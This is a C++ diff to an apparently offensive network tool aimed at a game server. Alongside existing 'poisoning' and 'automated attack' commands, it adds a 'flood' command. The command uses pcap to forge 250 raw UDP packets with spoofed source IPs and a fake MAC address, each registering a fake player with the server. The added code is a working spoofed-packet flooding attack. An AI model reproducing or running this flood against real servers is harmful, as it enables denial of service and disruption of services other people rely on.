@@ -40,6 +40,7 @@ void CommandManager::PrintHelp(std::string message) {
   std::cout << "startps - Start poisoning the server" << std::endl;
   std::cout << "stopps - Stop poisoning the server" << std::endl;
   std::cout << "a|attack - Perform the automated attack" << std::endl;
+  std::cout << "f|flood - Flood the server with spam bots" << std::endl;
 }
 
 void CommandManager::Respawn(std::string message) {
@@ -165,6 +166,48 @@ void CommandManager::AutomatedAttack(std::string message) {
   // Listen and respond to server (using enemies as drones)
 }
 
+void CommandManager::Flood(std::string message) {
+  // Floods the server with spam bots
+  if (pcap == NULL) {
+    std::cout << "You must first choose a valid device" << std::endl;
+    return;
+  }
+
+  if (server_mac == NULL) {
+    std::cout << "No server MAC found, have you scanned the network?";
+    std::cout << std::endl;
+    return;
+  }
+
+  char payload[512];
+  char ip[32];
+  const u_short header_length = sizeof(struct UdpHeader) +
+                                sizeof(struct Ipv4Header) +
+                                sizeof(struct EthernetHeader);
+
+  for (size_t i = 0; i < 250; i++) {
+    sprintf_s(payload, "Register  TOTALLY\nLEGIT\nPLAYER\n%d,Guy,Fawkes,0", i);
+    sprintf_s(ip, "10.0.0.%d", i);
+    u_int length = strlen(payload);
+    u_char* packet = (u_char*) malloc(length + header_length);
+
+    u_char* message = packet + header_length;
+    memcpy(message, payload, length);
+
+    WriteUdp(length, packet, (client_port + i), server_port, server_mac,
+             (char*) "1337420b142e", ip, strdup(server_ip.c_str()));
+
+    if (pcap_sendpacket(pcap, packet, length + header_length) != 0) {
+      std::cout << "Error sending packet: " << pcap_geterr(pcap) << std::endl;
+      return;
+    }
+
+    free(packet);
+  }
+
+  std::cout << "Server flooded" << std::endl;
+}
+
 void CommandManager::Run() {
   std::unordered_map<std::string, Command> commands = {
     {"help", &CommandManager::PrintHelp},
@@ -186,7 +229,9 @@ void CommandManager::Run() {
     {"startps", &CommandManager::StartPoisonServer},
     {"stopps", &CommandManager::StopPoisonServer},
     {"attack", &CommandManager::AutomatedAttack},
-    {"a", &CommandManager::AutomatedAttack}
+    {"a", &CommandManager::AutomatedAttack},
+    {"flood", &CommandManager::Flood},
+    {"f", &CommandManager::Flood}
   };
 
   std::cout << std::endl << "Enter commands here, type 'help' for help.";
